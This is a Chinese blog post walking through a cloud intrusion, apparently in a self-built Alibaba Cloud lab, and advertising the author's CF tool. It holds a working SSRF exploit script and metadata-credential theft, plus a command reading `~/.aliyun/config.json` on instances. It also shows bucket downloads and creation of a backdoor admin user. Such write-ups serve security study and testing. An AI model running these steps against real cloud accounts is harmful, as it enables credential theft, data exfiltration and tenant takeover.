---
title: 我用 CF 打穿了他的云上内网
date: 2022-07-13 19:22:51
id: 220713-192251
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131933165.png
tags:
- 云安全
- 安全工具
- 案例
categories:
- 云安全
---

## 0x00 前言

最近在做项目的时候，测到了一个部署在云上的存在 Laravel UEditor SSRF 漏洞的站点，并且发现这个 SSRF 漏洞可以读取到临时凭证，这不巧了，正好最近写了一个云环境利用的工具。

开始之前这里先简单介绍一下这个工具，CF 是这个工具的名字，通过它可以很方便的进行云上内网渗透，比如一键在所有实例上执行命令、一键接管控制台、一键列出云服务资源等等。

项目地址：[https://github.com/teamssix/cf](https://github.com/teamssix/cf)

使用手册：[https://wiki.teamssix.com/cf](https://wiki.teamssix.com/cf)

十分建议在使用 CF 的时候，边使用边参考 CF 的使用手册，发现 CF 更多功能，那话不多说，下面咱们就开始吧。

## 0x01 打点，但，是云环境

一开始还是信息收集，首先通过指纹扫描发现在目标范围内的一个站点使用了 Laravel 框架，接着测试发现该站点存在 Laravel UEditor SSRF 漏洞。

这里的 SSRF 漏洞触发点在 UEditor 编辑器的上传图片功能中，下面我们尝试让服务器从 https://baidu.com?.jpg 获取图片。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131930443.png)

然后我们读取返回的文件地址，通过返回的内容可以看到服务端确实访问到了 https://baidu.com?.jpg，说明这里确实存在 SSRF 漏洞。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131931262.png) 通过查询该域名所属 IP，发现该站点位于云上，那么我们就可以利用这个 SSRF 漏洞去获取实例的元数据信息，但是这样每次获取数据都要手动发两个数据包就很麻烦，所以这里简单搞个脚本。

```
  import sys
  import requests
  
  ssrf_url = sys.argv[1]
  headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.3100.0 Safari/537.36"}
  
  req1 = requests.get("https://your_target.com/laravel-u-editor-server/server?action=catchimage&source[]=" + ssrf_url,headers=headers)
  req2 = requests.get(req1.json()["list"][0]["url"],headers=headers)
  
  print(req2.text)
```

通过查询该站点的 IP 得知该站点位于阿里云上，阿里云的元数据地址为 http://100.100.100.200/latest/meta-data，我们尝试获取一下。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131932494.png)

可以看到成功获取到了元数据信息，并且值得注意的是，在元数据信息里还有 `ram/`目录，这就意味着这台实例存在临时访问凭证，也就是说存在被进一步利用的可能性。

我们一步步打开 `ram/`目录，在 http://100.100.100.200/latest/meta-data/ram/security-credentials/laravel-test-role 下找到了临时访问凭证。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131932066.png)

不同于传统的打点，云环境的打点在我看来，除了传统打点的类型外，拿到云服务的 Access Key 也应该可以被称之为打点，那么在打到点后，接下来就可以开始内网横向了。

## 0x02 云上内网横向，也得细心呀

当我们拿到临时访问凭证后，首先要做的就是得知道这个凭证具备哪些权限。

我们先把凭证配置到 CF 里，CF 下载地址：https://github.com/teamssix/cf/releases

```
  cf configure
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131932631.png)

查看当前凭证的权限

```
  cf ls permissions
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131932280.png)

可以看到当前权限具有 OSS 的全部权限，并且可以使用 CF 的「列出 OSS 资源」以及「下载 OSS 资源」的功能。

这里先列出 OSS 资源看看

```
  cf oss ls
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131932348.png)

可以看到在该凭证下有四个存储桶，一个是公开的，三个是私有的。

查看一下存储桶里有哪些文件

```
  cf oss ls -b bucketName
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131933378.png)

利用 CF 下载文件，如果想下载全部对象，则不指定 `-k`参数即可。

```
  cf oss get -b bucketName -k objectKey
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131933648.png)

大概翻了一下存储桶里的文件，在公有存储桶里大部分是图片，私有存储桶里有几十个压缩包文件和大量图片等等，这几百张图片里只发现了几张有敏感信息的图片，整体来说价值不大。

后来过了一会儿还是另外一位师傅在私有存储桶里一个个的翻文件，最后在几十个压缩包里终于找到了一个有高价值的配置文件，于是事情开始出现了转机，不得不说，还是得细心啊。

查看这个配置文件，发现在配置文件里写的是「OSS 相关配置信息」

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131933114.png)

但是当我们配置上这个 AK 后，发现这个 AK 还具有 ECS 的权限。

> 在后来拿下管理员权限后，我们发现这个用户被配置到了具备 ECS 权限的用户组里去了，所以这里才会有 ECS 的权限。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131933165.png)

先用 CF 看一下有哪些 ECS 实例

```
  cf ecs ls
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131933873.png)

使用 CF 一键获取临时访问凭证

```
  cf ecs exec -m
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131934073.png)

发现只有一个实例可以获取到临时访问凭证，而且这个有临时访问凭证的实例就是上述存在 SSRF 漏洞的那台机器。

于是通过临时访问凭证横向的这条路就断了，那就继续在实例上信息收集吧，看看能不能找到什么有价值的信息，最后发现有一台实例安装了 aliyun cli 工具，并且配置过 AK，那么这样一来我们就可以通过查看 aliyun cli 工具的配置文件获取到这个 AK。

```
 cf ecs exec -c "cat ~/.aliyun/config.json"
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131934723.png)

将 CF 配置上这个 AK，并查看权限

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131934082.png)

发现这个 AK 的权限要比之前的几个都要大，这个 AK 具有 `AliyunRAMFullAccess`权限，这也就意味着我们可以创建一个管理员后门用户，并通过该用户去接管控制台。

## 0x03 拿下云上管理员权限，相当于拿下“域控”？

使用 CF 一键接管控制台

```
 cf console
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131935299.png)

在浏览器中，打开控制台登录地址，并输入用户名、密码进行登录。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131935449.png)

在访问控制里，可以看到当前权限为`AdministratorAccess`，这也就意味着我们已经拿到了该租户的管理员权限。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131935714.png)

在控制台中看看这个账号下的 OSS 对象存储服务

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202207131935949.png)

其他的 ECS、RDS 等等云服务也都是可以查看并操作的，这里就不再一一截图了，到这里为止，其实在我看来就相当于已经拿下了传统内网中的“域控”权限。

基本上这个云账号下的绝大部分操作都是可以执行的了，只不过在控制台下有些操作需要二次校验，但其实还是有办法绕过的，绕过的方法也很简单，相信你能猜到 ~

> 最后还有一些值得注意的地方，是需要了解的：
>
> 1. 在 ECS 实例中执行一些高危命令，例如反弹 Shell 这类，可能会引发云盾告警。
> 2. CF 接管控制台会创建一个后门用户，在使用完后，记得取消接管，使用 `cf console cancel`命令即可取消接管，后门用户也会随之删除。
> 3. 为了充分表达云上内网横向的过程以及更加完整的展示 CF 的使用，文中少部分内容非真实发生且部分内容进行了省略。
> 4. 出于保护目标但又想学习交流的目的，以上云上环境均为个人搭建，不代表目标的实际情况。

## 0x04 总结

记得以前大家一起做项目的时候，那个时候如果有人打点打到云上的主机时，就会在协作平台里标注一句「这个是云主机，不用花太多时间去深入」。

但随着企业业务的不断上云，打点打到云上主机的概率也在可感知的越来越大，似乎传统内网的奶酪正在不断变少，这时如果不去寻找新的奶酪（指云上内网横向），也许在不久的将来就会陷入两难的境地。

因此本文既是在介绍我写的这个云环境利用框架 CF 工具，也是在描绘一种在新场景下的内网横向手法，这里的内网横向不仅仅是从这台机器到那台机器，而是从这个云服务到那个云服务，例如从 OSS 到 ECS 再到 RAM 等等，在这其中又包含了从这个机器到那台机器，例如多台 ECS 实例之间的内网横向。

现在 xx 在即，也希望我写的这个工具以及这篇文章能够为你在实战中带来新的启发和新的思路，如果感觉 CF 这个工具似乎还可以的话，师傅你不妨动动小手给 CF 点个 Star，嘿嘿~ ，CF 项目地址：[https://github.com/teamssix/cf](https://github.com/teamssix/cf)

>  更多信息欢迎关注我的个人微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152148071.png)
